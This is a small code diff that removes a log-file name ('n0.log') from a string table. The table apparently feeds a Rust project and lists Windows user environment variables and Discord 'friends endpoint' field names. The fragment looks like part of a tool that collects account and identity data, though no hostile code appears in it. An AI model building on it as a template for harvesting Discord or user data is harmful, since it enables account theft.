@@ -549,7 +549,6 @@ STRINGS = [
     ("env_userdomain", "USERDOMAIN"),
     ("env_username", "USERNAME"),
     ("main_unknown", "unknown"),
-    ("main_log_file", "n0.log"),
 
     # === discord/mod.rs - JSON field names (friends endpoint) ===
     ("discord_field_type", "type"),
